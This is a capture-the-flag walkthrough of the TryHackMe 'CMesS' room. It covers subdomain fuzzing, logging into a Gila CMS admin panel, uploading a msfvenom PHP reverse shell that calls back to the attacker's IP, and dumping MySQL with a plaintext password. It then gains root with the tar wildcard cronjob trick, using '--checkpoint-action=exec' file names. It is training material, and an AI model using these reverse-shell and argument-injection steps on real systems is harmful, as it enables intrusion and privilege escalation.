# CMesS

## Introduction:

Welcome to my another writeup! In this TryHackMe [CMesS](https://tryhackme.com/room/cmess) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background:

> Can you root this Gila CMS box?
> Please add `MACHINE_IP_ADDRESS` cmess.thm to `/etc/hosts`
> Please also note that this box does not require brute forcing!

## Difficulty:

> **Medium**

# Enumeration:

**Rustscan result:**
```
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# export IP=10.10.13.182

┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $IP -- -sC -sV -oN rustscan/rustscan.txt
...
Open 10.10.13.182:22
Open 10.10.13.182:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 02:22 EDT
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

The `rustscan` result indicates that port `22` and `80` is open, which is `SSH` and `HTTP` respectively, and the target is a Ubuntu machine.

## HTTP Port:

Use `ffuf` to fuzz the subdomain:
```
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm/ -H "HOST: FUZZ.cmess.thm" -fw 522

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 2924ms]
:: Progress: [4989/4989] :: Job [1/1] :: 174 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

We found `dev` subdomain.

Add `dev.cmess.thm` in `/etc/hosts`
```
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# nano /etc/hosts       
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.13.182 cmess.thm dev.cmess.thm
```

`http://dev.cmess.thm/` content:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a1.png)

Since we now have the andre creds, we can login to the Gila CMS admin panel with his email and password.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a3.png)

# Initial Shell:

Now we have control of the admin panel, we can now upload a reverse shell in `Content` -> `File Manager`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a4.png)

First, generate a php reverse shell via msfvenom:

```
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# msfvenom -p php/reverse_php LHOST=10.18.61.134 LPORT=443 -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3036 bytes
Saved as: shell.php
                                                                                                                        
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# cp shell.php /home/nam/Downloads
```

Then, upload the reverse shell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a7.png)

Finally, setup a listener and trigger it via browsing `http://cmess.thm/assets/shell.php`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a9.png)

# Privilege Escalation:

## www-data to andre:

In the "File Manager", we can also see there is a `config.php` file, which contains MySQL database configuration, such as user and password.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a10.png)

We can now login into MySQL database and dump the entire database:

`mysqldump -uroot -pr0otus3rpassw0rd --all-databases > /var/www/html/assets/databases.sql`

Now we can download the databases via `wget`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/CMesS]
└─# wget http://cmess.thm/assets/databases.sql
```

By looking through the database dump, we can see there is a hash for andre user:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a11.png)

However, I found that this hash is uncrackable.

By enumerating much deeper, I found a `.password.bak` file in `/opt`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a12.png)

We can now `ssh` in `andre` user with newly found password.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a13.png)

## andre to root:

`user.txt`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a14.png)

By doing manual enumeration, I found that there is one cronjob is running every two minutes.

```bash
andre@cmess:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

We can gain a root privilege is because that cronjob is **running as root**, and using a wildcard to `tar` all the files in `/home/andre/backup`.

According to GTFObins, we can create files that will be interpreted as options for the `tar` command, to ultimately execute something like a reverse shell.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a15.png)

To do so, we can write a bash reverse shell, and create two files: `--checkpoint=1` and `--checkpoint-action=exec=bash revshell.sh`. Then wait the cronjob runs.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a16.png)

Proof-of-Concept:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a18.png)

# Rooted

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/CMesS/images/a17.png)

# Conclusion

**What we've learned:**

1. Subdomain enumeration
2. Abusing Gila CMS to gain an initial shell
3. Dumping MySQL database entires
4. Abusing a cronjob that's running tar command to gain root privilege
5. Wildcard in a cronjob could lead to root privilege